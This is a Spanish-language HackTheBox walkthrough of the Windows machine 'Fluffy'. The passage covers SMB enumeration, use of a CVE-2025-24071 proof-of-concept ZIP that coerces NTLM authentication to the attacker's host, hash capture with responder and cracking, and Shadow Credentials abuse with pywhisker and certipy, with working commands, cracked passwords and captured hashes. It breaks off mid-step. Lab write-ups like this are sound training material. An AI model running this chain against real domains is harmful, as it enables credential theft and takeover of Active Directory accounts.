Propiedades:
- OS: Windows
- Plataforma: HackTheBox
- Nivel: Easy
- Tags: #certipy #esc16 #shadow-credentials #pywhisker #ad #CVE-2025-24071 #smb #bloodhound #rusthound

![](assets/Pasted%20image%2020260117221236.png)

Credenciales iniciales:  j.fleischman / J0elTHEM4n1990!
## Reconocimiento

Comienzo con un ping para comprobar la conectividad.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/fluffy]
└─$ ping -c 1 10.129.65.160
PING 10.129.65.160 (10.129.65.160) 56(84) bytes of data.
64 bytes from 10.129.65.160: icmp_seq=1 ttl=127 time=112 ms

--- 10.129.65.160 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 111.945/111.945/111.945/0.000 ms
```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/fluffy]
└─$ sudo nmap -p- -Pn -n -sS --min-rate 5000 -vvv 10.129.65.160 -oG nmap/allPorts

Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49689/tcp open  unknown          syn-ack ttl 127
49690/tcp open  unknown          syn-ack ttl 127
49700/tcp open  unknown          syn-ack ttl 127
49705/tcp open  unknown          syn-ack ttl 127
49715/tcp open  unknown          syn-ack ttl 127
49736/tcp open  unknown          syn-ack ttl 127
```

Sobre los puertos abiertos tiro un segundo escaneo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/fluffy]
└─$ sudo nmap -p 53,88,139,389,445,464,593,636,3268,3269,5985,9389,49667,49689,49690,49700,49705,49715,49736 -sV -sC -vvv -Pn -n 10.129.65.160 -oN nmap/target

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-01-18 11:15:52Z)
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-18T11:17:27+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
| -----BEGIN CERTIFICATE-----
| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAeFw0yNTA0MTcxNjA0MTdaFw0yNjA0
| MTcxNjA0MTdaMBoxGDAWBgNVBAMTD0RDMDEuZmx1ZmZ5Lmh0YjCCASIwDQYJKoZI
| <MAS..>
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-18T11:17:25+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
| -----BEGIN CERTIFICATE-----
| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAeFw0yNTA0MTcxNjA0MTdaFw0yNjA0
| MTcxNjA0MTdaMBoxGDAWBgNVBAMTD0RDMDEuZmx1ZmZ5Lmh0YjCCASIwDQYJKoZI
| <MAS..>
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-18T11:17:27+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
| -----BEGIN CERTIFICATE-----
| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAeFw0yNTA0MTcxNjA0MTdaFw0yNjA0
| <MAS..>
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-18T11:17:25+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
| -----BEGIN CERTIFICATE-----
| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAeFw0yNTA0MTcxNjA0MTdaFw0yNjA0
| MTcxNjA0MTdaMBoxGDAWBgNVBAMTD0RDMDEuZmx1ZmZ5Lmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAOFkXHPh6Bv/Ejx+B3dfWbqtAmtOZY7gT6XO
| <MAS..>
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49689/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49700/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49705/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49715/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49736/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 52010/tcp): CLEAN (Timeout)
|   Check 2 (port 24185/tcp): CLEAN (Timeout)
|   Check 3 (port 53873/udp): CLEAN (Timeout)
|   Check 4 (port 39355/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-time:
|   date: 2026-01-18T11:16:45
|_  start_date: N/A

```

Por la informacion que tenemos puedo intuir que estamos contra un `DC`.

- Puerto 88 Kerberos
- Puerto 135 RPC
- Puerto 139, 445 SMB
- Puerto 389, 636 LDAP
- Puerto 5985 WinRm

## Enumeración

### Puerto 445 SMB.

Saque informacion general de la maquina:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/fluffy]
└─$ nxc smb 10.129.65.160
SMB         10.129.65.160   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
```

- Dominio **fluffy.htb**
- Nombre de la maquina **DC01**

Voy a colocarlo en el /etc/hosts.

```bash
10.129.65.160 fluffy.htb DC01.fluffy.htb DC01
```

Enumere los shares a los que tengo acceso y vi lo siguiente:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/fluffy]
└─$ nxc smb fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
SMB         10.129.65.160   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.129.65.160   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
SMB         10.129.65.160   445    DC01             [*] Enumerated shares
SMB         10.129.65.160   445    DC01             Share           Permissions     Remark
SMB         10.129.65.160   445    DC01             -----           -----------     ------
SMB         10.129.65.160   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.65.160   445    DC01             C$                              Default share
SMB         10.129.65.160   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.65.160   445    DC01             IT              READ,WRITE
SMB         10.129.65.160   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.65.160   445    DC01             SYSVOL          READ            Logon server share
```

- Tengo permisos de lectura y escritura en el share IT.

También puedo enumerar usuarios utilizando `netexec`: 

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/fluffy]
└─$ nxc smb fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!' --users
SMB         10.129.65.160   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.129.65.160   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
SMB         10.129.65.160   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.129.65.160   445    DC01             Administrator                 2025-04-17 15:45:01 0       Built-in account for administering the computer/domain
SMB         10.129.65.160   445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.129.65.160   445    DC01             krbtgt                        2025-04-17 16:00:02 0       Key Distribution Center Service Account
SMB         10.129.65.160   445    DC01             ca_svc                        2025-04-17 16:07:50 0
SMB         10.129.65.160   445    DC01             ldap_svc                      2025-04-17 16:17:00 0
SMB         10.129.65.160   445    DC01             p.agila                       2025-04-18 14:37:08 0
SMB         10.129.65.160   445    DC01             winrm_svc                     2025-05-18 00:51:16 0
SMB         10.129.65.160   445    DC01             j.coffey                      2025-04-19 12:09:55 0
SMB         10.129.65.160   445    DC01             j.fleischman                  2025-05-16 14:46:55 0
```

Al conectarme al recurso IT vi lo siguiente: 

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/fluffy]
└─$ smbclient //10.129.65.160/IT -U 'j.fleischman%J0elTHEM4n1990!'

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jan 18 11:28:55 2026
  ..                                  D        0  Sun Jan 18 11:28:55 2026
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 15:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 15:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 15:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 15:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 14:31:07 2025
```

Me voy a descargar todos los archivos.

```bash
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

Esto son todos los recursos.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/fluffy/content]
└─$ tree
.
├── Everything-1.4.1.1026.x64
│   ├── everything.exe
│   └── Everything.lng
├── Everything-1.4.1.1026.x64.zip
├── KeePass-2.58
│   ├── KeePass.chm
│   ├── KeePass.exe
│   ├── KeePass.exe.config
│   ├── KeePassLibC32.dll
│   ├── KeePassLibC64.dll
│   ├── KeePass.XmlSerializers.dll
│   ├── Languages
│   ├── License.txt
│   ├── Plugins
│   ├── ShInstUtil.exe
│   └── XSL
│       ├── KDBX_Common.xsl
│       ├── KDBX_DetailsFull_HTML.xsl
│       ├── KDBX_DetailsLight_HTML.xsl
│       ├── KDBX_PasswordsOnly_TXT.xsl
│       └── KDBX_Tabular_HTML.xsl
├── KeePass-2.58.zip
└── Upgrade_Notice.pdf
```

El archivo **Upgrade_Notice.pdf** revela que la infraestructura actual tiene algunas vulnerabilidades, entre ellas:

- CVE-2025-24996
- CVE-2025-24071

![](assets/Pasted%20image%2020260117225536.png)

## Acceso Inicial.

Investigando sobre cada vulnerabilidad me di cuenta que puedo abusar del **[CVE-2025-24071](https://github.com/ThemeHackers/CVE-2025-24071)**.

La vulnerabilidad existe gracias a como la librería `.library-ms` parsea archivos. Un atacante puede construir un RAR/ZIP malicioso conteniendo un archivo que a su vez contiene la direccion de un servidor SMB malicioso, al momento de la descompresión se dispara un intento de autenticación contra el servidor SMB lo que provoca la captura de hashes NTLM.

Yo voy a utilizar el siguiente [PoC](https://github.com/ThemeHackers/CVE-2025-24071/tree/main) para generar un zip malicioso.

```bash
──(venv)─(wndr㉿wndr)-[~/…/hackthebox/fluffy/content/CVE-2025-24071]
└─$ python3 exploit.py -f payload -i 10.10.16.34

          ______ ____    ____  _______       ___     ___    ___    _____        ___    _  _      ___    ______   __
         /      |\   \  /   / |   ____|     |__ \   / _ \  |__ \  | ____|      |__ \  | || |    / _ \  |____  | /_ |
        |  ,----' \   \/   /  |  |__    ______ ) | | | | |    ) | | |__    ______ ) | | || |_  | | | |     / /   | |
        |  |       \      /   |   __|  |______/ /  | | | |   / /  |___ \  |______/ /  |__   _| | | | |    / /    | |
        |  `----.   \    /    |  |____       / /_  | |_| |  / /_   ___) |       / /_     | |   | |_| |   / /     | |
         \______|    \__/     |_______|     |____|  \___/  |____| |____/       |____|    |_|    \___/   /_/      |_|


                                                Windows File Explorer Spoofing Vulnerability (CVE-2025-24071)
                    by ThemeHackers'

Creating exploit with filename: payload.library-ms
Target IP: 10.10.16.34

Generating library file...
✓ Library file created successfully

Creating ZIP archive...
✓ ZIP file created successfully

Cleaning up temporary files...
✓ Cleanup completed

Process completed successfully!
Output file: exploit.zip
Run this file on the victim machine and you will see the effects of the vulnerability such as using ftp smb to send files etc.
```

Ahora voy a utilizar `responder` para envenenar la red y capturar hashes NTLM.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/fluffy]
└─$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|

```

Por ultimo tengo que subir mi exploit.zip al recurso IT del SMB para ver si alguien lo extrae.

```bash
┌──(venv)─(wndr㉿wndr)-[~/…/hackthebox/fluffy/content/CVE-2025-24071]
└─$ smbclient //10.129.65.160/IT -U 'j.fleischman%J0elTHEM4n1990!'
Try "help" to get a list of possible commands.
smb: \> put exploit.zip
putting file exploit.zip as \exploit.zip (0.6 kB/s) (average 0.6 kB/s)
smb: \> ls
  .                                   D        0  Sun Jan 18 12:17:59 2026
  ..                                  D        0  Sun Jan 18 12:17:59 2026
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 15:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 15:04:05 2025
  exploit.zip                         A      322  Sun Jan 18 12:17:59 2026
  KeePass-2.58                        D        0  Fri Apr 18 15:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 15:03:17 2025
  reverse.exe                         A     7168  Sun Jan 18 12:01:42 2026
  Upgrade_Notice.pdf                  A   169963  Sat May 17 14:31:07 2025

                5842943 blocks of size 4096. 1895655 blocks available
smb: \> ls
  .                                   D        0  Sun Jan 18 12:18:51 2026
  ..                                  D        0  Sun Jan 18 12:18:51 2026
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 15:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 15:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 15:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 15:03:17 2025
  reverse.exe                         A     7168  Sun Jan 18 12:01:42 2026
  Upgrade_Notice.pdf                  A   169963  Sat May 17 14:31:07 2025

                5842943 blocks of size 4096. 1895362 blocks available
```

- Podemos ver que en efecto el archivo fue extraído.

Devuelta al `responder` podemos ver que se capturo el hash del usuario `p.agila`.

```bash
[SMB] NTLMv2-SSP Client   : 10.129.65.160
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:1bfa5957b75065d0:8DC685F2151160530DBD21535D0C2310:01010000000000000035D0657488DC01233C1A2159A88F4D0000000002000800330047003900370001001E00570049004E002D00300034005300590052004A004F0042004D003300530004003400570049004E002D00300034005300590052004A004F0042004D00330053002E0033004700390037002E004C004F00430041004C000300140033004700390037002E004C004F00430041004C000500140033004700390037002E004C004F00430041004C00070008000035D0657488DC0106000400020000000800300030000000000000000100000000200000F4F6730479780CFCBE0EF71C8E92C7D958ABCCBA3ACCF8EE327133A25097FB210A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330034000000000000000000
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
```

Voy a crackear este hash.

```bash
┌──(venv)─(wndr㉿wndr)-[~/Machines/hackthebox/fluffy]
└─$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

P.AGILA::FLUFFY:1bfa5957b75065d0:8dc685f2151160530dbd21535d0c2310:01010000000000000035d0657488dc01233c1a2159a88f4d0000000002000800330047003900370001001e00570049004e002d00300034005300590052004a004f0042004d003300530004003400570049004e002d00300034005300590052004a004f0042004d00330053002e0033004700390037002e004c004f00430041004c000300140033004700390037002e004c004f00430041004c000500140033004700390037002e004c004f00430041004c00070008000035d0657488dc0106000400020000000800300030000000000000000100000000200000f4f6730479780cfcbe0ef71c8e92c7d958abccba3accf8ee327133a25097fb210a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00330034000000000000000000

:prometheusx-303
```

- Credenciales p.agila / prometheusx-303

Ahora probamos las credenciales.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/fluffy]
└─$ nxc smb fluffy.htb -u 'p.agila' -p 'prometheusx-303'
SMB         10.129.65.160   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.129.65.160   445    DC01             [+] fluffy.htb\p.agila:prometheusx-303
```

- Funcionan.
## Escalada de Privilegios.

Voy a utilizar `Bloodhound` para enumerar el dominio.

- **BloodHound** es una herramienta de **enumeración y análisis de Active Directory** que usa **grafos** para identificar **relaciones de confianza, permisos y rutas de escalada de privilegios** entre usuarios, grupos y equipos dentro de un dominio.

Para esto primero tengo que utilizar un **ingestor** que se va a encargar de recopilar toda la informacion del dominio. Yo utilice [rusthound](https://github.com/g0h4n/RustHound-CE)

```bash
┌──(wndr㉿wndr)-[~/Tools/RustHound-CE]
└─$ ./rusthound-ce -d fluffy.htb -u p.agila@fluffy.htb -z
---------------------------------------------------
Initializing RustHound-CE at 00:22:43 on 01/16/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-01-16T00:22:43Z INFO  rusthound_ce] Verbosity level: Info
[2026-01-16T00:22:43Z INFO  rusthound_ce] Collection method: All
Password:
[2026-01-16T00:22:49Z INFO  rusthound_ce::ldap] Connected to fluffy.htb Active Directory!
[2026-01-16T00:22:49Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-01-16T00:22:49Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-01-16T00:22:51Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=certified,DC=htb
[2026-01-16T00:22:51Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-01-16T00:22:53Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=certified,DC=htb
[2026-01-16T00:22:53Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-01-16T00:22:55Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=certified,DC=htb
[2026-01-16T00:22:55Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-01-16T00:22:56Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=certified,DC=htb
[2026-01-16T00:22:56Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-01-16T00:22:56Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=certified,DC=htb
[2026-01-16T00:22:56Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-01-16T00:22:56Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10
⠄ Parsing LDAP objects: 5%                                                                                                                                                                                          [2026-01-16T00:22:56Z INFO  rusthound_ce::objects::enterpriseca] Found 12 enabled certificate templates
[2026-01-16T00:22:56Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::maker::common] 10 users parsed!
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::maker::common] 61 groups parsed!
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::maker::common] 1 ous parsed!
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::maker::common] 74 containers parsed!
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::maker::common] 34 certtemplates parsed!
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::maker::common] .//20260116002256_fluffy-htb_rusthound-ce.zip created!
```

- Esto nos genera un zip que podemos importar a Bloodhound.

### GenericAll sobre Service Accounts.

Al importar la informacion en bloodhound puedo ver lo siguiente.

- **p.agila** tiene el permiso GenericAll sobre el grupo **Service Accounts**.

![](assets/Pasted%20image%2020260117232625.png)

Este permiso me permite agregar al usuario **p.agila** al grupo **Service Accounts**. 

Esto lo podemos hacer con `net rpc`: 

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/fluffy]
└─$ net rpc group addmem "Service Accounts" "p.agila" -U "fluffy.htb"/"p.agila"%"prometheusx-303" -S 10.129.65.160
```

### Shadow Credentials sobre ca_svc y winrm_svc.

Ahora que somos parte del grupo **Service Accounts** podemos volver a bloodhound para ver lo siguiente:

- El grupo **Service Accounts** tiene el permiso **Generic Write** sobre las cuentas **ldap_svc**, **winrm_svc** y **ca_svc**.

![](assets/Pasted%20image%2020260117232823.png)

El permiso **GenericWrite** permite escribir sobre los atributos de estas cuentas. Una forma de abusar de este permiso consiste en modificar el atributo **`msDS-KeyCredentialLink`**, agregando una **credencial alternativa** basada en un **par de claves y un certificado**, lo que permite obtener acceso a la cuenta objetivo.

Esta técnica de ataque se conoce como **Shadow Credentials**. 

- Shadow Credentials sobre ca_svc:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/fluffy]
└─$ pywhisker -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "ca_svc" --action "add"
[*] Searching for the target account
[*] Target user found: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 423e73f1-7023-4567-636f-656fcae781d6
[*] Updating the msDS-KeyCredentialLink attribute of ca_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: 3MsS4OK8.pfx
[*] Must be used with password: TQERCYQBVojzdEX3b7ki
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

Con ese certificado podemos pedir un TGT y obtener el hash NTLM de la cuenta ca_svc:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/fluffy]
└─$ certipy auth \
  -pfx 3MsS4OK8.pfx \
  -password TQERCYQBVojzdEX3b7ki \
  -username ca_svc \
  -domain fluffy.htb -dc-ip 10.129.65.160
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Got hash for 'ca_svc@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:ca0f4f9e9eb8a092addf53bb03fc98c8
```

- Tenemos el hash NTLM `ca0f4f9e9eb8a092addf53bb03fc98c8` y el TGT `ccache` de la cuenta **ca_svc**.

Podemos hacer lo mismo para la cuenta **winrm_svc**.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/fluffy]
└─$ pywhisker -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "winrm_svc" --action "add"
[*] Searching for the target account
[*] Target user found: CN=winrm service,CN=Users,DC=fluffy,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 2bc891ba-9e23-8a96-b674-b3b48efbb08b
[*] Updating the msDS-KeyCredentialLink attribute of winrm_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: fn85Pfg5.pfx
[*] Must be used with password: pe7LdIsdVS4SBazWoq2U
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

Con el certificado solicitamos el TGT y el hash NTLM.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/fluffy]
└─$ certipy auth \
  -pfx fn85Pfg5.pfx \
  -password pe7LdIsdVS4SBazWoq2U \
  -username winrm_svc \
  -domain fluffy.htb -dc-ip 10.129.65.160
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
